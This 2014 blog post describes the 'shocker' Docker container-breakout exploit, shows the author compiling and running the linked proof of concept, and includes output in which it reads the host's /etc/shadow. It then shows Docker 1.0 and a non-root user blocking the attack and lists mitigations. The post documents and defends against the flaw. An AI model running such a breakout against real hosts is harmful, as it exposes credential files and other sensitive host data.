---
layout: post
title: "Docker Container Break-out Exploit"
date: 2014-06-19 12:00:00
categories: docker,security
---

Amidst various blog postings on Docker, a [security issue][docker_security_exploit] announced yesterday that detailed an exploit of [Docker][Docker] that makes it possible to do container breakout. This exploit would allow the ability to any data, including sensitive data, on the host system.

How does it work? Essentially, the file system struct of the container is shared with the host which allows a program on the container to run that can open file handles-- which consist of a 64-bit string and a 32-bit inode number. Starting at an inode value of 2, which is / (root filesystem), the file system path is then walked and the use of brute force the 32-bit inode number to find the desired file.

The code to test this,  [shocker.c][shocker_dot_c], which was developed by Sebastian Krahmer (Thank you!) can be used to demonstrate this exploit, and indeed I was able to:

    root@cd0401b8027e:~# gcc -o shocker -Wall -std=c99 -O2 shocker.c -static

    iroot@cd0401b8027e:~# ./shocker
    [***] docker VMM-container breakout Po(C) 2014             [***]
    [***] The tea from the 90's kicks your sekurity again.     [***]
    [***] If you have pending sec consulting, I'll happily     [***]
    [***] forward to my friends who drink secury-tea too!      [***]

    <enter>
    ... hit enter ..
    [*] Resolving 'etc/shadow'
    [*] Found etc
    [+] Match: etc ino=262145
    [*] Brute forcing remaining 32bit. This can take a while...
    [*] (etc) Trying: 0x00000000
    [*] #=8, 1, char nh[] = {0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
    [*] Resolving 'shadow'
    [*] Found .
    [*] Found ..
    [*] Found hdparm.conf
    [*] Found gnome-app-install
    [*] Found hosts.deny
    [*] Found sysfs.conf
    [*] Found sudoers.d
    [*] Found securetty
    [*] Found passwd-
    [*] Found rpc
    [*] Found lintianrc
    [*] Found usb_modeswitch.d
    [*] Found rc.local
    [*] Found rcS.d
    [*] Found gtk-3.0

       ...  <snip> list of numerous files </snip> ...
    [*] Found shadow
    [+] Match: shadow ino=310601
    [*] Brute forcing remaining 32bit. This can take a while...
    [*] (shadow) Trying: 0x00000000
    [*] #=8, 1, char nh[] = {0x49, 0xbd, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
    [!] Got a final handle!
    [*] #=8, 1, char nh[] = {0x49, 0xbd, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
    [!] Win! /etc/shadow output follows:
    root:!:16108:0:99999:7:::
    daemon:*:15819:0:99999:7:::
    bin:*:15819:0:99999:7:::
    sys:*:15819:0:99999:7:::
    sync:*:15819:0:99999:7:::
    games:*:15819:0:99999:7:::
    man:*:15819:0:99999:7:::
    lp:*:15819:0:99999:7:::
    mail:*:15819:0:99999:7:::
    news:*:15819:0:99999:7:::
    uucp:*:15819:0:99999:7:::
    proxy:*:15819:0:99999:7:::
    www-data:*:15819:0:99999:7:::
    backup:*:15819:0:99999:7:::
    list:*:15819:0:99999:7:::
    irc:*:15819:0:99999:7:::
    gnats:*:15819:0:99999:7:::
    nobody:*:15819:0:99999:7:::
    libuuid:!:15819:0:99999:7:::
    syslog:*:15819:0:99999:7:::
    messagebus:*:15819:0:99999:7:::
    avahi-autoipd:*:15819:0:99999:7:::
    usbmux:*:15819:0:99999:7:::
    dnsmasq:*:15819:0:99999:7:::
    whoopsie:*:15819:0:99999:7:::
    kernoops:*:15819:0:99999:7:::
    rtkit:*:15819:0:99999:7:::
    speech-dispatcher:!:15819:0:99999:7:::
    lightdm:*:15819:0:99999:7:::
    avahi:*:15819:0:99999:7:::
    colord:*:15819:0:99999:7:::
    pulse:*:15819:0:99999:7:::
    hplip:*:15819:0:99999:7:::
    saned:*:15819:0:99999:7:::
    patg:xkjsljdflsjlfjsljflswjwflkjw:16119:0:99999:7:::
    sshd:*:16108:0:99999:7:::
    lxc-dnsmasq:!:16108:0:99999:7:::
    rabbitmq:!:16108:0:99999:7:::
    mysql:!:16108:0:99999:7:::
    libvirt-qemu:!:16120:0:99999:7:::
    libvirt-dnsmasq:!:16120:0:99999:7:::
<br />
Oops! ```/etc/shadow``` is definitely not a file on my host I want to be visible by a container.

    $ docker -v
    Docker version 0.11.1, build fb99f99

<br />
With a newer version of Docker (1.0.0), this is not a problem:

    docker -v
    Docker version 1.0.0, build 63fe64c

    root@5698e0f422f2:/# ./shocker
    [***] docker VMM-container breakout Po(C) 2014             [***]
    [***] The tea from the 90's kicks your sekurity again.     [***]
    [***] If you have pending sec consulting, I'll happily     [***]
    [***] forward to my friends who drink secury-tea too!      [***]

    <enter>

    [*] Resolving 'etc/shadow'
    [-] open_by_handle_at: Operation not permitted

<br />
Do note though, one must not rest upon their laurels or getting to comfortable with the default configuration despite being 1.0.

Some of the suggested fixes are to use apparmor or selinux containment, map trust groups to separate machines or to avoid running the app as root. I think the quickest fix and one that I tested and found easiest was running as a regular user. On my first instance where the exploit worked, using an ```ubuntu``` user solved the issue:

    ubuntu@cd0401b8027e:~$ ./shocker
    [***] docker VMM-container breakout Po(C) 2014             [***]
    [***] The tea from the 90's kicks your sekurity again.     [***]
    [***] If you have pending sec consulting, I'll happily     [***]
    [***] forward to my friends who drink secury-tea too!      [***]

    <enter>

    [-] open: Permission denied

<br />
The article also states that there will be further enhancements to [Docker][Docker] including [user-namespaces][user_namespaces]. For the full scoop, the [article is here][docker_security_exploit]

[user_namespaces]: http://lwn.net/Articles/528078/
[docker_security_exploit]: https://news.ycombinator.com/item?id=7909622
[shocker_dot_c]: http://stealth.openwall.net/xSports/shocker.c
[Docker]: http://docker.io
[Ansible]: http://www.ansible.com/home
[ansible_dynamic_inventory]: http://docs.ansible.com/intro_dynamic_inventory.html#dynamic-inventory
[ansible_example_repository]: https://github.com/ansible/ansible-examples
[ansible_documentation]: http://docs.ansible.com/
[ansible_apt_module]: http://docs.ansible.com/apt_module.html
[ansible_docker_module]: http://docs.ansible.com/docker_module.html
[ansible_docker_image_module]: http://docs.ansible.com/docker_image_module.html
[ansible_docker_facts_module]: https://github.com/CaptTofu/ansible/tree/docker_facts
[ansible_docker_dynamic_inventory]: https://github.com/ansible/ansible/blob/devel/plugins/inventory/docker.py
[docker-py]: https://github.com/dotcloud/docker-py
[docker_intro_blog]: http://patg.net/containers,virtualization,docker/2014/06/05/docker-intro/
[docker_install_blog]: http://patg.net/containers,virtualization,docker/2014/06/09/docker-install/
[docker_using_blog]: http://patg.net/containers,virtualization,docker/2014/06/10/using-docker/
[ansible_playbooks]: http://docs.ansible.com/playbooks.html
[ansible_example_playbook_repository]: https://github.com/ansible/ansible-examples
[docker_cli]: https://docs.docker.com/reference/commandline/cli/
[AnsibleFest]: http://www.marketwired.com/press-release/speakers-from-twitter-google-twilio-edx-rackspace-headline-ansiblefest-nyc-2014-1902858.htm
[ansible_docker_presentation]: http://www.slideshare.net/PatrickGalbraith/docker-ansible-34909080
